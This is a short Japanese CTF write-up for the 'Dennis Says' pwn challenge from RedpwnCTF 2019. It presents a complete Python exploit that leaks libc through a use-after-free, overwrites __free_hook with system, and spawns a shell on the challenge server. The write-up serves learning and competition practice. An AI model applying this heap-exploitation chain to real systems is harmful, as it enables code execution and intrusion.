# [pwn 344pts] Dennis Says - RedpwnCTF 2019
32ビットでPIE以外有効です。
```
$ checksec -f dennis
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   RW-RUNPATH   97 Symbols     Yes      0               6       dennis
```
double freeやらUAFがあるバイナリです。
libc-2.23なのでtcacheは使えません。
また、任意アドレスに書き込める関数があります。
RELROが無効なので、適当にGOT Overwriteすればlibcリーク&シェル起動ができそうです。
が、競技中は頭がお猿さんだったので、最初の方はUAFの方ばかり見ていて任意アドレス書き込みに気づいておらず、UAFでlibcリークしています。
```python
from ptrlib import *

def malloc(size):
    sock.sendlineafter("Command me: ", "1")
    sock.sendlineafter(" : ", str(size))
    return

def read(size):
    sock.sendlineafter("Command me: ", "2")
    sock.sendlineafter(": ", str(size))
    return sock.recv(size)

def write(data):
    sock.sendlineafter("Command me: ", "4")
    sock.sendlineafter(": ", data)
    return

def free():
    sock.sendlineafter("Command me: ", "5")
    return

def yeet():
    sock.sendlineafter("Command me: ", "3")
    return

def repeat(data):
    sock.sendlineafter("Command me: ", "6")
    sock.sendlineafter("Dennis repeat\n", data)
    return sock.recvline()

#sock = Process("./dennis")
#libc = ELF("/lib32/libc-2.27.so")
libc = ELF("./libc-2.23.so")
sock = Socket("chall2.2019.redpwn.net", 4006)
#sock = Socket("localhost", 9999)
libc_main_arena = 0x1b0780
delta = 0x30

# libc leak
malloc(0x20)
free()
malloc(0x30)
free()
malloc(0x40)
free()
malloc(0x20)
free()
libc_base = u32(read(8)[4:8]) - libc_main_arena - delta
logger.info("libc = " + hex(libc_base))

# overwrite __free_hook
malloc(0x10)
write(p32(libc_base + libc.symbol("system")) + p32(libc_base + libc.symbol("__free_hook")))
yeet()

# get the shell
malloc(0x10)
write("/bin/sh\x00")
free()

sock.interactive()
```

# 感想
また面倒なことをしてしまった。
